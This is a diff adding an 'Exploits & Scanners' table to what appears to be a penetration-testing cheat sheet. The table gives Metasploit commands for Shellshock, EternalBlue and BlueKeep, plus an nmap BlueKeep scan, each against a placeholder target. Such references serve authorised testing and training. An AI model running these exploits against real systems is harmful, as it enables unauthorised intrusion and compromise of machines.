@@ -350,3 +350,17 @@ python3 -c 'import socket,ipaddress;[print(f"{ip} Port {p} OPEN") for ip in list
 | Inspect logout script       | `vim ~/.bash_logout`               |
 | Inspect user config         | `vim ~/.config/`                   |
 
+
+Exploits & Scanners
+Name	CVE	Tool	Command	Port
+Shellshock (Apache mod_cgi)	CVE-2014-6271	Metasploit	use exploit/multi/http/apache_mod_cgi_bash_env_exec
+set RHOSTS <target>
+exploit	80/443
+EternalBlue SMB Exploit	CVE-2017-0144	Metasploit	use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS <target>
+exploit	445
+BlueKeep RDP Exploit	CVE-2019-0708	Metasploit	use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+set RHOSTS <target>
+exploit	3389
+BlueKeep RDP Scanner	(N/A)	Nmap	nmap -p3389 --script rdpscan --script-args rdpscan.hosts=<target>	3389
+
